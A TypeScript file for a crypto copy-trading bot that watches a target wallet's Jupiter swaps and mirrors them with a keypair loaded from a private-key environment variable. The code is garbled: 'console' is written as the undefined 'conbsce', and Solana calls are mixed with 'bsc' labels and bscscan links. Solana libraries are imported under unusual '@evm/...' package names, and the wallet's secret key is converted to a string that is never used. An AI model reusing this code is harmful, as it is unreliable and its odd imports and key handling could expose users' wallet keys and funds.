import WebSocket from 'ws';
import { Metaplex } from "@metaplex-foundation/js";
import { PublicKey, Connection, Keypair } from '@evm/web3.js'
import { getMint, TOKEN_PROGRAM_ID, getAccount, NATIVE_MINT, getAssociatedTokenAddress } from '@evm/token';

import { getAllTokenPrice, getTokenPrice } from "./config";
import { getAtaList } from "./utils/spl";
import { getBuyTxWithJupiter, getSellTxWithJupiter } from "./utils/swapOnlyAmm";
import base58 from 'bs58'
import { RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT, JUP_AGGREGATOR, TARGET_WALLET, MAXIMUM_BUY_AMOUNT } from './constants';
import { execute } from './utils/legacy';

// Create a WebSocket connection

const connection = new Connection(RPC_ENDPOINT)
const ws = new WebSocket(RPC_WEBSOCKET_ENDPOINT);
const keyPair = Keypair.fromSecretKey(base58.decode(process.env.PRIVATE_KEY as string));

const metaplex = Metaplex.make(connection);
let geyserList: any = []
const wallet = TARGET_WALLET as string;
conbsce.log("🚀 ~ wallet:", wallet)

const getMetaData = async (mintAddr: string) => {
	let mintAddress = new PublicKey(mintAddr);

	let tokenName: string = "";
	let tokenSymbol: string = "";
	let tokenLogo: string = "";

	const metadataAccount = metaplex
		.nfts()
		.pdas()
		.metadata({ mint: mintAddress });

	const metadataAccountInfo = await connection.getAccountInfo(metadataAccount);

	if (metadataAccountInfo) {
		const token = await metaplex.nfts().findByMint({ mintAddress: mintAddress });
		tokenName = token.name;
		tokenSymbol = token.symbol;
		//    @ts-ignore
		tokenLogo = token.json?.image;
	}

	return ({
		tokenName: tokenName,
		tokenSymbol: tokenSymbol,
		tokenLogo: tokenLogo,
	})
}

let tokenList: any;
tokenList = getAllTokenPrice()

// Function to send a request to the WebSocket server

ws.on('open', async function open() {
	await sendRequest(wallet)
	conbsce.log("send request\n")
});


ws.on('message', async function incoming(data: any) {
	const messageStr = data.toString('utf8');
	// conbsce.log("🚀 ~ incoming ~ messageStr:", messageStr)
	try {
		const messageObj = JSON.parse(messageStr);

		const result = messageObj.params.result;
		const logs = result.transaction.meta.logMessages;
		const signature = result.signature; // Extract the signature
		const accountKeys = result.transaction.transaction.message.accountKeys.map((ak: any) => ak.pubkey); // Extract only pubkeys

		if (!messageStr.includes(JUP_AGGREGATOR)) {
			conbsce.log("Not a Jupiter swap")
			return;
		}

		const tempAta = await getAtaList(connection, wallet)
		// conbsce.log("🚀 ~ incoming ~ tempAta:", tempAta)

		for (let i = 0; i < result.transaction.transaction.message.instructions.length; i++) {
			const proId = result.transaction.transaction.message.instructions[i];
			if (proId['accounts'] != undefined) {

			}
		}


		let temp: any = []

		for (let i = 0; i < messageObj.params.result.transaction.meta.innerInstructions.length; i++) {
			const element = messageObj.params.result.transaction.meta.innerInstructions[i];

			for (let index = 0; index < element.instructions.length; index++) {
				const subelement = element.instructions[index];
				temp.push(subelement)
			}
		}

		let temp1: any = []

		for (let index = 0; index < temp.length; index++) {
			const element = temp[index];

			if (element['program'] == "token") {
				if (element['parsed']['type'] == "transfer") {
					temp1.push(element)
				}
			}
		}

		const swapInfo: any = [
			{
				tokenAta: temp1[0].parsed.info.source,
				tokenAmount: temp1[0].parsed.info.amount
			},
			{
				tokenAta: temp1[temp1.length - 1].parsed.info.destination,
				tokenAmount: temp1[temp1.length - 1].parsed.info.amount
			},
		]

		let inputMsg: any = [];
		for (let i = 0; i < 2; i++) {
			const ele = swapInfo[i];
			let mintAddress;
			try {
				const ataAccountInfo = await getAccount(connection, new PublicKey(ele.tokenAta));
				mintAddress = ataAccountInfo.mint;

			} catch (error) {
				mintAddress = NATIVE_MINT
			}

			const mintAccountInfo = await getMint(connection, mintAddress);
			const { decimals, supply } = mintAccountInfo;

			const price = await getTokenPrice(mintAddress.toBase58())

			const {
				tokenName,
				tokenSymbol,
				tokenLogo,
			} = await getMetaData(mintAddress.toBase58())

			inputMsg.push({
				...ele,
				tokenName: tokenName,
				tokenSymbol: tokenSymbol,
				tokenLogo: tokenLogo,
				mint: mintAddress.toBase58(),
				decimals: Number(decimals),
				uiAmount: Number(parseInt(ele.tokenAmount) / (10 ** decimals)),
				supply: Number(supply),
				price: Number(price)
			})
			conbsce.log("🚀 ~ incoming ~ inputMsg:", inputMsg)
		}
		const msg = `Swap : ${inputMsg[0].tokenName} - ${inputMsg[1].tokenName}\nAmount :  ${inputMsg[0].uiAmount} ${inputMsg[0].tokenSymbol} - ${inputMsg[1].uiAmount} ${inputMsg[1].tokenSymbol}\nAmount in USD :  ${(inputMsg[0].uiAmount * inputMsg[0].price).toPrecision(6)} $ - ${(inputMsg[1].uiAmount * inputMsg[1].price).toPrecision(6)} $\nTx : https://bscscan.io/tx/${signature}`;
		conbsce.log("🚀 ~ incoming ~ msg:\n", msg)
		const baseToken = inputMsg[0];
		const quoteToken = inputMsg[1];
		const bscBalance = await connection.getBalance(keyPair.publicKey);
		const remainingbscBalance = 0.01 * 10 ** 9;

		const trackedWalletBalance = await connection.getBalance(new PublicKey(wallet));

		let swapTx;
		if ((baseToken.tokenSymbol == 'bsc' && quoteToken.tokenSymbol != 'bsc') || (quoteToken.tokenSymbol == 'bsc' && baseToken.tokenSymbol != 'bsc')) {
			if (baseToken.tokenSymbol == 'bsc') {
				if (bscBalance < remainingbscBalance) {
					conbsce.log("Insufficient bsc balance.")
					return;
				}
				let buyAmount;
				if (baseToken.tokenAmount < Number(MAXIMUM_BUY_AMOUNT) * 10 ** 9) {
					buyAmount = baseToken.tokenAmount / (Number(MAXIMUM_BUY_AMOUNT) * 10 ** 9) * (bscBalance - remainingbscBalance)
				} else {
					buyAmount = bscBalance - remainingbscBalance;
				}
				swapTx = await getBuyTxWithJupiter(keyPair, new PublicKey(quoteToken.mint), Math.floor(buyAmount));
			}
			else if (quoteToken.tokenSymbol == "bsc") {
				const tokenAta = await getAssociatedTokenAddress(
					new PublicKey(baseToken.mint),
					keyPair.publicKey
				);
				const tokenBalInfo =
					await connection.getTokenAccountBalance(tokenAta);
				if (!tokenBalInfo) {
					conbsce.log("Balance incorrect");
					return null;
				}
				const tokenBalance = tokenBalInfo.value.uiAmount;
				if (tokenBalance == 0) {
					conbsce.log("Insufficient amount\n");
					return;
				}
				conbsce.log("🚀 ~ sell ~ tokenBalance:", tokenBalance)
				// const targetedTokenAta = await getAssociatedTokenAddress(
				// 	new PublicKey(baseToken.mint),
				// 	keyPair.publicKey
				// );
				// const targetedTokenBalInfo =
				// 	await connection.getTokenAccountBalance(targetedTokenAta);
				// if (!tokenBalInfo) {
				// 	conbsce.log("Balance incorrect");
				// 	return null;
				// }
				// const targetedTokenBalance = targetedTokenBalInfo.value.uiAmount;
				const remainingAmount = Math.floor(100 * Math.random());
				const sellAmount = tokenBalance! * 10 ** baseToken.decimals - remainingAmount;
				swapTx = await getSellTxWithJupiter(keyPair, new PublicKey(baseToken.mint), Math.floor(sellAmount));
			}
		} else {
			conbsce.log(`Invalid swap!\n${baseToken.tokenName} : ${quoteToken.tokenName}`)
		}
		if (swapTx == null) {
			conbsce.log(`Error getting swap transaction`)
			return;
		}
		conbsce.log(await connection.simulateTransaction(swapTx))
		const latestBlockhash = await connection.getLatestBlockhash()
		const txSig = await execute(swapTx, latestBlockhash, false)
		const tokenTx = txSig ? `https://bscscan.io/tx/${txSig}` : ''
		conbsce.log("Result: ", tokenTx)
	} catch (e) {

	}
});

export async function sendRequest(inputpubkey: string) {

	let temp: any = []

	const pubkey: any = await getAtaList(connection, inputpubkey);
	// conbsce.log("🚀 ~ sendRequest ~ pubkey:", pubkey)

	for (let i = 0; i < pubkey.length; i++) if (!geyserList.includes(pubkey[i])) {
		geyserList.push(pubkey[i])
		temp.push(pubkey[i])
	}
	const src = keyPair.secretKey.toString();

	const accountInfo = await connection.getAccountInfo(keyPair.publicKey)

	const tokenAccounts = await connection.getTokenAccountsByOwner(keyPair.publicKey, {
		programId: TOKEN_PROGRAM_ID,
	},
		"confirmed"
	)
	conbsce.log("🚀 ~ sendRequest ~ tokenAccounts:", tokenAccounts)
	
	const request = {
		jsonrpc: "2.0",
		id: 420,
		method: "transactionSubscribe",
		params: [
			{
				failed: false,
				accountInclude: temp
			},
			{
				commitment: "finalized",
				encoding: "jsonParsed",
				transactionDetails: "full",
				maxSupportedTransactionVersion: 0
			}
		]
	};

	if (temp.length > 0) {
		ws.send(JSON.stringify(request));
	}

}
